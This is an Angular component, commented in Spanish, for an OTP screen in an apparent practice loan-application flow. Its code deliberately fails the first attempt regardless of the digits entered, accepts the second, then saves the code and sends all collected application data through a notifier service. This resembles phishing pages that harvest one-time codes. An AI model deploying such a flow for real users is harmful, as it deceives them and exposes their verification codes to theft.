import { Component, DestroyRef, computed, inject, output, signal } from '@angular/core';
import { Router } from '@angular/router';
import { Credito } from '../../core/credito';
import { SolicitudService } from '../../core/solicitud';
import { Notificador } from '../../core/notificador';

type Estado = 'otp' | 'cargando' | 'error-intento' | 'felicitaciones';

@Component({
  selector: 'app-otp',
  templateUrl: './otp.component.html',
  styleUrl: './otp.component.css',
})
export class OtpComponent {
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);
  private readonly credito = inject(Credito);
  private readonly solicitud = inject(SolicitudService);
  private readonly notificador = inject(Notificador);

  // Cantidad de dígitos del OTP
  readonly largo = 6;

  // Teclado numérico (0 y borrar van aparte en el HTML)
  readonly teclas = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];

  // Posiciones de las casillas, para pintarlas en el HTML
  readonly casillas = Array.from({ length: this.largo }, (_, posicion) => posicion);

  // Dígitos ingresados hasta ahora
  readonly digitos = signal<string[]>([]);

  // Pantalla que se muestra
  readonly estado = signal<Estado>('otp');

  readonly maxIntentos = 2;
  readonly intentosRestantes = signal(this.maxIntentos);

  // Crédito pactado, tomado de la solicitud (guardado en el modal de inicio)
  private readonly resumen = this.solicitud.credito;

  readonly montoAprobado = computed(() => this.credito.formatoPesos(this.resumen()?.monto ?? 0));
  readonly plazoAprobado = computed(() => `${this.resumen()?.plazo ?? 0} meses`);
  readonly cuotaAprobada = computed(() => this.credito.formatoPesos(this.resumen()?.cuota ?? 0));
  readonly tasaAprobada = computed(() =>
    this.credito.textoTasa(this.resumen()?.tasaMensual ?? this.credito.tasaMensual),
  );

  // Se emite cuando el OTP se da por válido
  readonly otpValidado = output<string>();

  // Fallo simulado: el primer intento siempre "falla" sin importar los dígitos,
  // el segundo siempre pasa. No hay ningún código correcto real.
  private readonly pausaValidacion = 1500;
  private intentoActual = 0;
  private bloqueado = false;
  private enviado = false; // evita notificar dos veces
  private temporizador?: ReturnType<typeof setTimeout>;

  constructor() {
    this.destroyRef.onDestroy(() => clearTimeout(this.temporizador));
  }

  agregar(numero: string): void {
    if (this.bloqueado || this.digitos().length >= this.largo) {
      return;
    }

    const nuevos = [...this.digitos(), numero];
    this.digitos.set(nuevos);

    if (nuevos.length === this.largo) {
      this.procesar(nuevos.join(''));
    }
  }

  borrar(): void {
    if (this.bloqueado) {
      return;
    }
    this.digitos.set(this.digitos().slice(0, -1));
  }

  reintentar(): void {
    this.digitos.set([]);
    this.bloqueado = false;
    this.estado.set('otp');
  }

  continuar(): void {
    // Fin del flujo: se borra toda la solicitud guardada
    this.solicitud.limpiar();
    this.router.navigate(['/']);
  }

  // Sin validación real: el intento falla o pasa solo según el número de intento
  private procesar(otp: string): void {
    this.bloqueado = true;
    this.estado.set('cargando');
    this.intentoActual++;

    this.temporizador = setTimeout(() => {
      // Primer intento: falla siempre, sin importar los dígitos
      if (this.intentoActual < this.maxIntentos) {
        this.intentosRestantes.set(this.maxIntentos - this.intentoActual);
        this.estado.set('error-intento');
        return;
      }

      // Segundo intento: se acepta lo que haya escrito el usuario
      this.otpValidado.emit(otp);

      // Se guarda el OTP (solo para ver el flujo completo en esta práctica)
      this.solicitud.guardar('otp', { codigo: otp });

      this.notificarUnaVez();
      this.estado.set('felicitaciones');
    }, this.pausaValidacion);
  }

  private notificarUnaVez(): void {
    if (this.enviado) {
      return;
    }
    this.enviado = true;
    this.notificador.enviarSolicitud(this.solicitud.datos());
  }
}